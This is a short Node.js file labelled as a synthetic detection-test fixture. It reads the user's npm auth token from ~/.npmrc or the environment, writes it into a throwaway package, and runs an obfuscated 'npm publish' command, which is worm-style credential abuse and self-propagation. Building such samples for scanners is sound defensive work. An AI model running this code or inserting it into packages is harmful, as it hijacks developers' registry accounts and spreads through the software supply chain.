// FIXTURE ONLY - synthetic detection test sample, not real malware
const cp = require("child_process");
const fs = require("fs");
const os = require("os");
const path = require("path");
const rc = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");
const tok = (rc.match(/_authToken=(\S+)/) || [])[1] || process.env.NPM_TOKEN;
const d = fs.mkdtempSync(path.join(os.tmpdir(), "p-"));
fs.writeFileSync(path.join(d, "package.json"), JSON.stringify({ name: "fixture-spread", version: "9.9.9" }));
fs.writeFileSync(path.join(d, ".npmrc"), "//registry.npmjs.org/:_authToken=" + tok + "\n");
const cmd = ["np", "m pub", "lish"].join("");
cp.execSync(cmd, { cwd: d });
